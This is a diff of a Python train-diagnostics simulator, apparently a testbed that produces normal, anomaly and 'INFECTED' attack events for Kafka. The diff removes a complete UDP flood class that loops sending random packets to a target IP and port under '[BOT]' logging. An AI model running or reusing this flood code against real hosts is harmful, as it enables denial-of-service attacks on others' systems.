@@ -21,94 +21,6 @@ from OpenFAIR import Train, EventType
 BASE_DIR = os.path.dirname(__file__)
 
 
-class Attack:
-    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
-        """
-        Crea un attaccante UDP per eseguire un flood su un target.
-
-        Parametri:
-        - target_ip: IP di destinazione
-        - target_port: Porta di destinazione (default: 80)
-        - duration: Durata dell'attacco in secondi (default: 60)
-        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
-        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
-        """
-        self.target_ip = target_ip
-        self.target_port = target_port
-        self.duration = duration
-        self.packet_size = packet_size
-        self.delay = delay
-        
-
-
-    def attack_condition(self):
-        if self.duration == 0:
-            return self.alive
-        else:
-            return self.alive and (time.time() < self.end_time)
-
-
-    def start_attack(self):
-        """
-        Esegui un attacco UDP flood sul target specificato.
-        """
-        # Crea il socket UDP
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-        # Crea dati casuali per il pacchetto
-        data = os.urandom(self.packet_size)
-        
-        packets_sent = 0
-        bytes_sent = 0
-        start_time = time.time()
-        self.end_time = start_time + self.duration
-
-        logger.info(f"[BOT] Starting UDP flood to {self.target_ip}:{self.target_port}")
-        if self.duration != 0:
-            logger.debug(f"[BOT] Test will run for {self.duration} seconds")
-        else:
-            logger.debug(f"[BOT] Attack will continue until stopped by user.")
-
-        logger.debug(f"[BOT] Packet size: {self.packet_size} bytes")
-
-        try:
-            self.alive = True
-            while self.attack_condition():
-                sock.sendto(data, (self.target_ip, self.target_port))
-                packets_sent += 1
-                bytes_sent += self.packet_size
-
-                # Stampa le statistiche ogni 10000 pacchetti
-                if packets_sent % 10000 == 0:
-                    elapsed = time.time() - start_time
-                    rate = packets_sent / elapsed if elapsed > 0 else 0
-                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
-                    logger.info(f"[BOT] Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
-
-                # Aggiungi un ritardo tra i pacchetti se specificato
-                if self.delay > 0:
-                    time.sleep(self.delay)
-
-        except Exception:
-            logger.debug("[BOT] Attack stopped unexpectedly!")
-
-        finally:
-            # Chiudi il socket
-            sock.close()
-
-            # Stampa le statistiche finali
-            elapsed = time.time() - start_time
-            rate = packets_sent / elapsed if elapsed > 0 else 0
-            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
-
-            logger.info("[BOT] Attack ended")
-            logger.debug(f"[BOT] Duration: {elapsed:.2f} seconds")
-            logger.debug(f"[BOT] Packets sent: {packets_sent}")
-            logger.debug(f"[BOT] Data sent: {bytes_sent/1000000:.2f} MB")
-            logger.debug(f"[BOT] Rate: {rate:.2f} packets per second")
-            logger.debug(f"[BOT] Throughput: {mbps:.2f} Mbps")
-
-
 # Create a lock object
 lock = threading.Lock()
 
@@ -250,34 +162,20 @@ def thread_anomalie(args):
     topic_name = f"{VEHICLE_NAME}_anomalies"
     eval_topic_name = f"{VEHICLE_NAME}_eval_anomalies"
 
-    """
-    if args.anomaly_classes == list(range(0,19)):
-        sample_anomaly_function = sample_anomaly_from_global
-    else:
-        sample_anomaly_function = sample_anomaly_from_clusters
-    """
-    
-    
-
     while not stop_threads:
 
         with attack_lock:
-            # health_dict = train_monitor.probe_health()
+
             if get_status_robust() == 'INFECTED':
                 event = EventType.ATTACK
                 produced_attacks += 1
             else:
                 event = EventType.ANOMALY
                 produced_anomalies += 1
-            # data_to_send.update(health_dict)
-            # data_to_send['node_status'] = attack_label
-            # produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
-
 
         synthetic_anomaly = virtual_train.step(event)
         eval_synth_anomaly = eval_virtual_train.step(event, adversarial=True)
 
-        # cluster, synthetic_anomaly = sample_anomaly_function()
         durata_anomalia = lognormal_anomalie.rvs(size=1)
         synthetic_anomaly['Durata'] = durata_anomalia[0]
         eval_synth_anomaly['Durata'] = durata_anomalia[0]
@@ -285,27 +183,14 @@ def thread_anomalie(args):
         eval_synth_anomaly['Flotta'] = 'ETR700'
         synthetic_anomaly['Veicolo'] = VEHICLE_NAME
         eval_synth_anomaly['Veicolo'] = VEHICLE_NAME
-        # synthetic_anomaly['Test'] = 'N'
         synthetic_anomaly['Timestamp'] = pd.Timestamp.now()
         eval_synth_anomaly['Timestamp'] = synthetic_anomaly['Timestamp']
         synthetic_anomaly['Timestamp chiusura'] = pd.to_datetime(synthetic_anomaly['Timestamp'] + pd.to_timedelta(synthetic_anomaly['Durata'], unit='s'))
         eval_synth_anomaly['Timestamp chiusura'] = synthetic_anomaly['Timestamp chiusura']
-        # synthetic_anomaly['Posizione'] = np.nan
-        # synthetic_anomaly['Sistema'] = 'VEHICLE'
-        # synthetic_anomaly['Componente'] = 'VEHICLE'
-        # synthetic_anomaly['Timestamp segnale'] = np.nan
-
-        """
-        for col in all_columns:
-            if col not in synthetic_anomaly.keys():
-                synthetic_anomaly[col] = np.nan
-        """
+       
                 
         synthetic_anomaly = round_dict_numbers(synthetic_anomaly,4)
         eval_synth_anomaly = round_dict_numbers(eval_synth_anomaly,4)
-
-        # synthetic_anomaly = synthetic_anomaly[all_columns]
-        # data_to_send = synthetic_anomaly.iloc[0].to_dict()
 
         data_to_send = convert_dict_to_json_serializable(synthetic_anomaly)
         data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
@@ -341,14 +226,6 @@ def thread_normali(args):
     lognormal_normali = lognorm(s=sigma_normali, scale=np.exp(np.log(media_durata_normali)))
     topic_name = f"{VEHICLE_NAME}_normal_data"
 
-    """
-    if args.diagnostics_classes == list(range(0,15)):
-        sample_normal_function = sample_normal_from_global
-    else:
-        sample_normal_function = sample_normal_from_clusters
-    """
-
-
     while not stop_threads:
         synthetic_normal = virtual_train.step(EventType.NORMAL)
         _ = eval_virtual_train.step(EventType.NORMAL, adversarial=True)
@@ -370,15 +247,10 @@ def thread_normali(args):
                 synthetic_normal[col] = np.nan
 
         synthetic_normal = round_dict_numbers(synthetic_normal, 4)
-        # synthetic_normal = synthetic_normal[all_columns]
-        # print(f"Nuova diagnostica generata: {synthetic_normali}")
-        # Convert data to JSON and send it to Kafka
-        #data_to_send = synthetic_normal.iloc[0].to_dict()
         
         data_to_send = convert_dict_to_json_serializable(synthetic_normal)
         data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
         data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
-        # data_to_send['cluster'] = str(cluster)
         
         produce_message(data_to_send, topic_name)
         produced_diagnostics += 1
